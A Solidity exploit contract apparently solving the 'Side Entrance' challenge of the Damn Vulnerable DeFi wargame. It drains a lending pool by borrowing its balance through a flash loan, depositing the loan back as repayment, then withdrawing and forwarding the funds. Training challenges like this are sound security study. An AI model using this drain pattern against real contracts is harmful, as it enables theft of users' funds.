// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolExploit is IFlashLoanEtherReceiver {
    address immutable pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function start() public {
        uint256 amount = pool.balance;
        ISideEntranceLenderPool(pool).flashLoan(amount);
        ISideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).call{value: amount}("");
    }

    function execute() external payable override {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}
